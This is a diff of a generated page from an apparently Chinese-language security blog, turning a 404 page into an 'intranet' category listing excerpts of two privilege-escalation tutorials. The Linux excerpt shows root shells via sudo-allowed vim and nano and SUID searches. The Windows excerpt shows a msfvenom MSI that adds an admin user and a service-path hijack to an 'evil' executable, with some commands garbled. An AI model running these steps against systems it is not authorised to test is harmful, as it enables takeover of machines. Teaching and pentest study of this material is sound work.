@@ -5,11 +5,11 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
-<title>404 Page not found | H4ck3r Station</title>
+<title>内网 | H4ck3r Station</title>
 <meta name="keywords" content="">
 <meta name="description" content="">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/404.html">
+<link rel="canonical" href="http://localhost:1313/categories/%E5%86%85%E7%BD%91/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
@@ -18,7 +18,8 @@
 <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/404.html">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/categories/%E5%86%85%E7%BD%91/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/categories/%E5%86%85%E7%BD%91/">
 <noscript>
     <style>
         #theme-toggle,
@@ -82,8 +83,65 @@
         </ul>
     </nav>
 </header>
-<main class="main">
-<div class="not-found">404</div>
+<main class="main"> 
+<header class="page-header">
+  <h1>
+    内网
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Linux提权
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>常规提权方式 一、sudo滥用提权 sudo -l提示要输入密码的原因:
+默认SUDO行为 : 需要输入当前用户的密码(不是root)密码
+sudoers配置问题: 未配置免密码访问 在/etc/sudoers文件中没有为当前用户配置NOPASSWD选项
+配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组
+检查当前用户所在组 id username 如果发现在wheel组中,检查wheel组的配置
+查看%wheel相关配置,看是否设置了NOPASSWD或要求密码
+sudo visudo 从wheel组中移除用户
+sudo gpasswd -d username wheel 利用步骤： 查看当前用户sudo权限：
+sudo -l 示例输出：(ALL) NOPASSWD: /usr/bin/vim 利用vim提权：
+sudo /usr/bin/vim 在vim中输入 :set shell=/bin/bash 回车 然后输入 :shell 回车 成功获得root shell 利用其他命令提权：
+如果发现可以执行/usr/bin/nano：
+sudo /usr/bin/nano 在nano中按Ctrl&#43;R，输入!bash，回车 即可获得root shell 说明： sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。
+二、SUID特殊权限提权 利用步骤： 查找SUID文件：
+find / -perm -u=s -type f 2&gt;/dev/null 利用/bin/mount提权：
+mkdir /tmp/mount touch /tmp/mount/malicious_file sudo /bin/mount -o bind /tmp/mount /tmp/mount sudo /bin/mount /tmp/mount /tmp/mount 通过此方式可获取root权限 利用/bin/ping提权：
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>6 min</span></footer>
+  <a class="entry-link" aria-label="post link to Linux提权" href="http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Windows提权
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Windows工作组环境和域环境提权方式详解 一、工作组环境提权方式 1. AlwaysInstallElevated提权 条件：
+系统已启用AlwaysInstallElevated（注册表值为1） 检查方法：
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 利用步骤：
+生成恶意MSI文件（在Kali Linux中）：
+msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd -f msi -o add.msi 如果在Windows上操作，可以使用在线工具生成MSI文件
+在Windows上执行：
+msiexec /i add.msi 验证提权：
+net user hacker 成功标志：看到hacker账户，且在管理员组中
+2. 服务权限配置错误提权 条件：
+服务路径权限配置错误 当前用户对服务可执行文件或目录有写权限 检查方法：
+sc query winpeas.exe quiet notcolor serviceinfo 利用步骤：
+找到一个服务（如Spooler）：
+sc qc Spooler 修改服务路径：
+reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&#34; /t REG_EXPAND_SZ /v ImagePath /d &#34;C:\evil\shell.exe&#34; /f 重启服务：
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>4 min</span></footer>
+  <a class="entry-link" aria-label="post link to Windows提权" href="http://localhost:1313/posts/windows%E6%8F%90%E6%9D%83/"></a>
+</article>
     </main>
     
 <footer class="footer">
